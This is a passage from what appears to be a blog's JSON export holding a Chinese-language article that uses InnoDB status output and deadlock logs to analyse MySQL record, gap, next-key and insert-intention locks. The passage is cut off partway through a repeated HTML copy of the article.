block，等待事务T2释放范围idx_b in (4， 9]上的next-key lock。\n\n事务T2插入记录(7, 7)时，要请求范围idx_b in (4, 9)上的insert intention lock，而请求的insert intention lock与事务T1已持有的gap lock是互斥的。\n于是，事务T2也会block，等待事务T2释放范围idx_b in (4， 9)上的gap lock。\n死锁便产生了。\n\n","slug":"article/database/通过InnoDB监控状态分析锁占用","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxrl002j5nbtkn4vgisc","content":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、表结构\"><a href=\"#一、表结构\" class=\"headerlink\" title=\"一、表结构\"></a>一、表结构</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">CREATE TABLE `t` (</div><div class=\"line\">  `id` int(11) NOT NULL,</div><div class=\"line\">  `stage` int(11) NOT NULL,</div><div class=\"line\">  PRIMARY KEY (`id`),</div><div class=\"line\">  KEY `idx_b` (`stage`)</div><div class=\"line\">) ENGINE=InnoDB DEFAULT CHARSET=utf8</div></pre></td></tr></table></figure>\n<h2 id=\"二、表数据\"><a href=\"#二、表数据\" class=\"headerlink\" title=\"二、表数据\"></a>二、表数据</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">+------+---------+</div><div class=\"line\">|   id |   stage |</div><div class=\"line\">|------+---------|</div><div class=\"line\">|    1 |       1 |</div><div class=\"line\">|    4 |       4 |</div><div class=\"line\">|    9 |       9 |</div><div class=\"line\">|   15 |      15 |</div><div class=\"line\">+------+---------+</div></pre></td></tr></table></figure>\n<h2 id=\"三、简单实例\"><a href=\"#三、简单实例\" class=\"headerlink\" title=\"三、简单实例\"></a>三、简单实例</h2><h3 id=\"1-事务执行时序表\"><a href=\"#1-事务执行时序表\" class=\"headerlink\" title=\"1. 事务执行时序表\"></a>1. 事务执行时序表</h3><p>事务(ID:41114)，在索引idx_b值为4上加排他锁。</p>\n<table>\n<thead>\n<tr>\n<th>T1(41114)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>begin;</td>\n</tr>\n<tr>\n<td>select * from t where stage = 4 for update;</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-查看InnoDB运行状态\"><a href=\"#2-查看InnoDB运行状态\" class=\"headerlink\" title=\"2. 查看InnoDB运行状态\"></a>2. 查看InnoDB运行状态</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">---TRANSACTION 41114, ACTIVE 41 sec</div><div class=\"line\">4 lock struct(s), heap size 1184, 3 row lock(s)</div><div class=\"line\">MySQL thread id 39, OS thread handle 0x700000a83000, query id 36756 localhost ::1 root cleaning up</div><div class=\"line\">TABLE LOCK table `<span class=\"built_in\">test</span>`.`t` trx id 41114 lock mode IX</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class=\"built_in\">test</span>`.`t` trx id 41114 lock_mode X</div><div class=\"line\">Record lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000004; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000004; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `<span class=\"built_in\">test</span>`.`t` trx id 41114 lock_mode X locks rec but not gap</div><div class=\"line\">Record lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000004; asc     ;;</div><div class=\"line\"> 1: len 6; hex 00000000a08b; asc       ;;</div><div class=\"line\"> 2: len 7; hex dd000001fa0110; asc        ;;</div><div class=\"line\"> 3: len 4; hex 80000004; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class=\"built_in\">test</span>`.`t` trx id 41114 lock_mode X locks gap before rec</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div></pre></td></tr></table></figure>\n<h3 id=\"3-解读InnoDB运行状态\"><a href=\"#3-解读InnoDB运行状态\" class=\"headerlink\" title=\"3. 解读InnoDB运行状态\"></a>3. 解读InnoDB运行状态</h3><p>事务T1总共加了4把锁：1把表，3把行锁。<br>表锁类型：IX</p>\n<p>行锁根据索引划分为加在聚集索引 PRIMARY 上的行锁和加在普通索引 idx_b 上的行锁。<br>加在聚集索引上的行锁1把，是一个排他的记录锁；<br>加在普通索引上的行锁2把，1把是next-key lock，锁住的范围为(1, 4]；1把是gap lock，锁住的范围为(4, 9)。</p>\n<a id=\"more\"></a>\n<h2 id=\"四、复杂实例\"><a href=\"#四、复杂实例\" class=\"headerlink\" title=\"四、复杂实例\"></a>四、复杂实例</h2><p>下面演示一个更加复杂的实例：GAP与Insert Intention冲突引发的死锁，分析死锁时各事务锁占用情况。</p>\n<h3 id=\"1-事务执行时序表-1\"><a href=\"#1-事务执行时序表-1\" class=\"headerlink\" title=\"1. 事务执行时序表\"></a>1. 事务执行时序表</h3><table>\n<thead>\n<tr>\n<th>T1(41121)</th>\n<th>T1(41122)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>begin;</td>\n<td>begin;</td>\n</tr>\n<tr>\n<td>select * from t where stage = 4 for update;</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>select * from t where stage = 9 for update;</td>\n</tr>\n<tr>\n<td>insert INTO t values (6, 6)</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>insert INTO t values (7, 7)</td>\n</tr>\n<tr>\n<td></td>\n<td>(1213, u’Deadlock found when trying to get lock; try restarting transaction’)</td>\n</tr>\n<tr>\n<td>Query OK, 1 row affected</td>\n<td>&nbsp;</td>\n</tr>\n</tbody>\n</table>\n<p>事务T1首先锁住stage=4的记录，然后插入(6, 6)的记录；<br>事务T2首先锁住stage=9的记录，然后插入(7, 7)的记录。</p>\n<h3 id=\"2-查看InnoDB运行状态-1\"><a href=\"#2-查看InnoDB运行状态-1\" class=\"headerlink\" title=\"2. 查看InnoDB运行状态\"></a>2. 查看InnoDB运行状态</h3><p>由于发生死锁后，其中一个事务会回滚，而无法查看到其事务锁占用状态。<br>因此，我们在在事务T2执行记录插入操作之前，查看一下当前各事务锁占用状态。如下所示：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div></pre></td><td class=\"code\"><pre><div class=\"line\">------------</div><div class=\"line\">TRANSACTIONS</div><div class=\"line\">------------</div><div class=\"line\">Trx id counter 41123</div><div class=\"line\">Purge <span class=\"keyword\">done</span> <span class=\"keyword\">for</span> trx<span class=\"string\">'s n:o &lt; 41120 undo n:o &lt; 0 state: running but idle</span></div><div class=\"line\">History list length 968</div><div class=\"line\">LIST OF TRANSACTIONS FOR EACH SESSION:</div><div class=\"line\">---TRANSACTION 0, not started</div><div class=\"line\">MySQL thread id 67, OS thread handle 0x700000ac7000, query id 37547 localhost ::1 root init</div><div class=\"line\">show ENGINE innodb status</div><div class=\"line\">---TRANSACTION 41105, not started</div><div class=\"line\">MySQL thread id 65, OS thread handle 0x700000b0b000, query id 36363 localhost 127.0.0.1 root cleaning up</div><div class=\"line\">---TRANSACTION 0, not started</div><div class=\"line\">MySQL thread id 64, OS thread handle 0x700000b4f000, query id 36362 localhost 127.0.0.1 root cleaning up</div><div class=\"line\">---TRANSACTION 0, not started</div><div class=\"line\">MySQL thread id 58, OS thread handle 0x700000a3f000, query id 37546 localhost root cleaning up</div><div class=\"line\">---TRANSACTION 41122, ACTIVE 26 sec</div><div class=\"line\">4 lock struct(s), heap size 1184, 3 row lock(s)</div><div class=\"line\">MySQL thread id 69, OS thread handle 0x700000bd7000, query id 37534 localhost ::1 root cleaning up</div><div class=\"line\">TABLE LOCK table `test`.`t` trx id 41122 lock mode IX</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41122 lock_mode X locks rec but not gap</div><div class=\"line\">Record lock, heap no 7 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 6; hex 00000000a08b; asc       ;;</div><div class=\"line\"> 2: len 7; hex dd000001fa011d; asc        ;;</div><div class=\"line\"> 3: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X locks gap before rec</div><div class=\"line\">Record lock, heap no 9 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 8000000f; asc     ;;</div><div class=\"line\"> 1: len 4; hex 8000000f; asc     ;;</div><div class=\"line\"></div><div class=\"line\">---TRANSACTION 41121, ACTIVE 34 sec inserting</div><div class=\"line\">mysql tables in use 1, locked 1</div><div class=\"line\">LOCK WAIT 5 lock struct(s), heap size 1184, 4 row lock(s), undo log entries 1</div><div class=\"line\">MySQL thread id 39, OS thread handle 0x700000a83000, query id 37538 localhost ::1 root update</div><div class=\"line\">insert INTO t values (6, 6)</div><div class=\"line\">------- TRX HAS BEEN WAITING 21 SEC FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">------------------</div><div class=\"line\">TABLE LOCK table `test`.`t` trx id 41121 lock mode IX</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X</div><div class=\"line\">Record lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000004; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000004; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41121 lock_mode X locks rec but not gap</div><div class=\"line\">Record lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000004; asc     ;;</div><div class=\"line\"> 1: len 6; hex 00000000a08b; asc       ;;</div><div class=\"line\"> 2: len 7; hex dd000001fa0110; asc        ;;</div><div class=\"line\"> 3: len 4; hex 80000004; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div></pre></td></tr></table></figure>\n<h3 id=\"3-死锁日志\"><a href=\"#3-死锁日志\" class=\"headerlink\" title=\"3. 死锁日志\"></a>3. 死锁日志</h3><p>事务T2执行记录插入操作，发生死锁。<br>死锁日志如下所示：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">------------------------</div><div class=\"line\">LATEST DETECTED DEADLOCK</div><div class=\"line\">------------------------</div><div class=\"line\">2016-08-04 13:39:05 700000bd7000</div><div class=\"line\">*** (1) TRANSACTION:</div><div class=\"line\">TRANSACTION 41121, ACTIVE 54 sec inserting</div><div class=\"line\">mysql tables <span class=\"keyword\">in</span> use 1, locked 1</div><div class=\"line\">LOCK WAIT 5 lock struct(s), heap size 1184, 4 row lock(s), undo <span class=\"built_in\">log</span> entries 1</div><div class=\"line\">MySQL thread id 39, OS thread handle 0x700000a83000, query id 37538 localhost ::1 root update</div><div class=\"line\">insert INTO t values (6, 6)</div><div class=\"line\">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class=\"built_in\">test</span>`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** (2) TRANSACTION:</div><div class=\"line\">TRANSACTION 41122, ACTIVE 46 sec inserting</div><div class=\"line\">mysql tables <span class=\"keyword\">in</span> use 1, locked 1</div><div class=\"line\">5 lock struct(s), heap size 1184, 4 row lock(s), undo <span class=\"built_in\">log</span> entries 1</div><div class=\"line\">MySQL thread id 69, OS thread handle 0x700000bd7000, query id 37555 localhost ::1 root update</div><div class=\"line\">insert INTO t values (7, 7)</div><div class=\"line\">*** (2) HOLDS THE LOCK(S):</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class=\"built_in\">test</span>`.`t` trx id 41122 lock_mode X</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** (2) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class=\"built_in\">test</span>`.`t` trx id 41122 lock_mode X locks gap before rec insert intention waiting</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** WE ROLL BACK TRANSACTION (2)</div></pre></td></tr></table></figure>\n<p>由上述死锁日志可知：两个事务都在等待加在这个位置的锁 <strong>space id 245 page no 4 n bits 80</strong>。<br>另外，</p>\n<h3 id=\"4-解读InnoDB运行状态\"><a href=\"#4-解读InnoDB运行状态\" class=\"headerlink\" title=\"4. 解读InnoDB运行状态\"></a>4. 解读InnoDB运行状态</h3><h4 id=\"事务T1\"><a href=\"#事务T1\" class=\"headerlink\" title=\"事务T1\"></a>事务T1</h4><p>事务T1总共 <strong>要加</strong> 5把锁：1把表，4把行锁。</p>\n<p><strong>表锁</strong><br>表锁类型：IX</p>\n<p><strong>行锁</strong><br>idx_b 上的排他 next-key lock，范围：idx_b in (1, 4]。<br>内存位置：space id 245 page no 4 n bits 80，heap no 7 PHYSICAL RECORD: n_fields 2;</p>\n<p>primary 上的排他 record lock，范围：primary=4。<br>内存位置：space id 245 page no 3 n bits 80，heap no 6 PHYSICAL RECORD: n_fields 4;</p>\n<p>idx_b 上的排他 gap lock，范围：idx_b in (4, 9)。<br>内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;</p>\n<p>idx_b 上的排他 insert intention lock，范围：idx_b in (4, 9)。<br>内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;</p>\n<p>其中，insert intention lock 是正等待加的锁。</p>\n<h4 id=\"事务T2\"><a href=\"#事务T2\" class=\"headerlink\" title=\"事务T2\"></a>事务T2</h4><p><strong>注</strong>：当前分析事务T2占用的锁快照为T2执行插入语句之前状态。</p>\n<p>事务T2总共加了4把锁：1把表，3把行锁。</p>\n<p><strong>表锁</strong><br>表锁类型：IX</p>\n<p><strong>行锁</strong><br>idx_b 上的排他 next-key lock，范围：idx_b in (4， 9]<br>内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;</p>\n<p>primary 上的排他 record lock，范围：primary=9<br>内存位置：space id 245 page no 3 n bits 80，heap no 7 PHYSICAL RECORD: n_fields 4;</p>\n<p>idx_b 上的排他 gap lock，范围：idx_b in (9， 15)<br>内存位置：space id 245 page no 4 n bits 80，heap no 9 PHYSICAL RECORD: n_fields 2;</p>\n<h4 id=\"死锁分析\"><a href=\"#死锁分析\" class=\"headerlink\" title=\"死锁分析\"></a>死锁分析</h4><p>在事务T1插入记录前，事务T1拿到了范围idx_b in (4, 9)的gap lock，事务T2拿到了范围idx_b in (4， 9]上的next-key lock。</p>\n<p>事务T1插入记录(6, 6)时，要请求范围idx_b in (4, 9)上的insert intention lock，而请求的insert intention lock与事务T2已持有next key lock是互斥的。<br>于是，事务T1 block，等待事务T2释放范围idx_b in (4， 9]上的next-key lock。</p>\n<p>事务T2插入记录(7, 7)时，要请求范围idx_b in (4, 9)上的insert intention lock，而请求的insert intention lock与事务T1已持有的gap lock是互斥的。<br>于是，事务T2也会block，等待事务T2释放范围idx_b in (4， 9)上的gap lock。<br>死锁便产生了。</p>\n","excerpt":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、表结构\"><a href=\"#一、表结构\" class=\"headerlink\" title=\"一、表结构\"></a>一、表结构</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">CREATE TABLE `t` (</div><div class=\"line\">  `id` int(11) NOT NULL,</div><div class=\"line\">  `stage` int(11) NOT NULL,</div><div class=\"line\">  PRIMARY KEY (`id`),</div><div class=\"line\">  KEY `idx_b` (`stage`)</div><div class=\"line\">) ENGINE=InnoDB DEFAULT CHARSET=utf8</div></pre></td></tr></table></figure>\n<h2 id=\"二、表数据\"><a href=\"#二、表数据\" class=\"headerlink\" title=\"二、表数据\"></a>二、表数据</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">+------+---------+</div><div class=\"line\">|   id |   stage |</div><div class=\"line\">|------+---------|</div><div class=\"line\">|    1 |       1 |</div><div class=\"line\">|    4 |       4 |</div><div class=\"line\">|    9 |       9 |</div><div class=\"line\">|   15 |      15 |</div><div class=\"line\">+------+---------+</div></pre></td></tr></table></figure>\n<h2 id=\"三、简单实例\"><a href=\"#三、简单实例\" class=\"headerlink\" title=\"三、简单实例\"></a>三、简单实例</h2><h3 id=\"1-事务执行时序表\"><a href=\"#1-事务执行时序表\" class=\"headerlink\" title=\"1. 事务执行时序表\"></a>1. 事务执行时序表</h3><p>事务(ID:41114)，在索引idx_b值为4上加排他锁。</p>\n<table>\n<thead>\n<tr>\n<th>T1(41114)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>begin;</td>\n</tr>\n<tr>\n<td>select * from t where stage = 4 for update;</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-查看InnoDB运行状态\"><a href=\"#2-查看InnoDB运行状态\" class=\"headerlink\" title=\"2. 查看InnoDB运行状态\"></a>2. 查看InnoDB运行状态</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">---TRANSACTION 41114, ACTIVE 41 sec</div><div class=\"line\">4 lock struct(s), heap size 1184, 3 row lock(s)</div><div class=\"line\">MySQL thread id 39, OS thread handle 0x700000a83000, query id 36756 localhost ::1 root cleaning up</div><div class=\"line\">TABLE LOCK table `<span class=\"built_in\">test</span>`.`t` trx id 41114 lock mode IX</div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class=\"built_in\">test</span>`.`t` trx id 41114 lock_mode X</div><div class=\"line\">Record lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000004; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000004; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `<span class=\"built_in\">test</span>`.`t` trx id 41114 lock_mode X locks rec but not gap</div><div class=\"line\">Record lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000004; asc     ;;</div><div class=\"line\"> 1: len 6; hex 00000000a08b; asc       ;;</div><div class=\"line\"> 2: len 7; hex dd000001fa0110; asc        ;;</div><div class=\"line\"> 3: len 4; hex 80000004; asc     ;;</div><div class=\"line\"></div><div class=\"line\">RECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `<span class=\"built_in\">test</span>`.`t` trx id 41114 lock_mode X locks gap before rec</div><div class=\"line\">Record lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000009; asc     ;;</div><div class=\"line\"> 1: len 4; hex 80000009; asc     ;;</div></pre></td></tr></table></figure>\n<h3 id=\"3-解读InnoDB运行状态\"><a href=\"#3-解读InnoDB运行状态\" class=\"headerlink\" title=\"3. 解读InnoDB运行状态\"></a>3. 解读InnoDB运行状态</h3><p>事务T1总共加了4把锁：1把表，3把行锁。<br>表锁类型：IX</p>\n<p>行锁根据索引划分为加在聚集索引 PRIMARY 上的行锁和加在普通索引 idx_b 上的行锁。<br>加在聚集索引上的行锁1把，是一个排他的记录锁；<br>加在普通索引上的行锁2把，1把是next-key lock，锁住的范围为(1, 4]；1把是gap lock，锁住的范围为(4, 9)。</p>","more":"<h2 id=\"四、复杂实例\"><a href=\"#四、复杂实例\" class=\"headerlink\" title=\"四、复杂实例\"></a>四、复杂实例</h2><p>下面演示一个更加复杂的实例：GAP与Insert Intention冲突引发的死锁，分析死锁时各事务锁占用情况。</p>\n<h3 id=\"1-事务执行时序表-1\"><a href=\"#1-事务执行时序表-1\" class=\"headerlink\" title=\"1. 事务执行时序表\"></a>1. 事务执行时序表</h3><table>\n<thead>\n<tr>\n<th>T1(41121)</th>\n<th>T1(41122)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>begin;</td>\n<td>begin;</td>\n</tr>\n<tr>\n<td>select * from t where stage = 4 for update;</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>select * from t where stage = 9 for update;</td>\n</tr>\n<tr>\n<td>insert INTO t values (6, 6)</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>insert INTO t values (7, 7)</td>\n</tr>\n<tr>\n<td></td>\n<td>(1213, u’Deadlock found when trying to get lock; try restarting transaction’)</td>\n</tr>\n<tr>\n<td>Query OK, 1 row affected</td>\n<td>&nbsp;</td>\n</tr>\n</tbody>\n</table>\n<p>事务T1首先锁住stage=4的记录，然后插入(6, 6)的记录；<br>事务T2首先锁住stage=9的记录，然后插入(7, 7)的记录。</p>\n<h3 id=\"2-查看InnoDB运行状态-1\"><a href=\"#2-查看InnoDB运行状态-1\" class=\"headerlink\" title=\"2. 查看InnoDB运行状态\"></a>2. 查看InnoDB运行状态</h3><p>由于发生死锁后，其中一个事务会回滚，而无法查看到其事务锁占用状态。<br>因此，我们在在事务T2执行记录插入操作之前，查看一下当前各事务锁占用状态。如下所示：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div 